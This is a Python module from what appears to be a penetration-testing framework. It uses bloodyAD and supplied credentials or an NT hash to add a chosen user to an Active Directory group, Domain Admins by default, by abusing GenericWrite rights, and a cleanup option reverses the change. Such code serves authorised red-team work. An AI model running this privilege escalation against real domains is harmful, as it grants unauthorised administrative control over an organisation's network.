import os

from module import BaseModule
from tool import Tool


class AddMember(BaseModule):
    path = "acl/addmember"
    description = "Add a user to a group. Requires GenericWrite on the target group."
    options = {
        "dc_ip": {
            "default": "",
            "description": "Domain Controller IP or host address. If empty, domain will be used.",
            "required": False,
        },
        "domain": {
            "default": "",
            "description": "Auth: Domain name (FQDN)",
            "required": True,
        },
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {
            "default": "",
            "description": "Auth: Password or NT Hash (for NTLM auth only)",
            "required": False,
        },
        "auth": {
            "default": "ntlm",
            "description": "Auth: Type (ntlm, krb)",
            "required": True,
        },
        "target_user": {
            "default": "",
            "description": "User to add as a member of the target group",
            "required": True,
        },
        "target_group": {
            "default": "Domain Admins",
            "description": "Group to modify (auth account needs GenericWrite on this group)",
            "required": False,
        },
        "cleanup": {
            "default": "no",
            "description": "Set to yes to remove user from group (cleanup mode) instead of adding",
            "required": False,
        },
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)

        tool = Tool(self)
        tool.set_output_pane(self.pane_b)

        if not tool.set_auth(from_module=True):
            return

        target_user = self.opts.target_user.strip()
        target_group = (self.opts.target_group or "Domain Admins").strip()
        cleanup = (self.opts.cleanup or "no").strip().lower() == "yes"
        operation = "remove" if cleanup else "add"
        status_terms = (
            ["removed"] if cleanup else ["added", "already a member", "already member"]
        )

        if not target_user:
            self.pane_a.write("[red][!] Option `target_user` cannot be empty.[/red]")
            return

        if not target_group:
            self.pane_a.write("[red][!] Option `target_group` cannot be empty.[/red]")
            return

        tool.title(
            "Remove target user from target group (cleanup)"
            if cleanup
            else "Add target user to target group"
        )
        await tool.bloodyad(
            [operation, "groupMember", target_group, target_user],
            status_terms,
        )
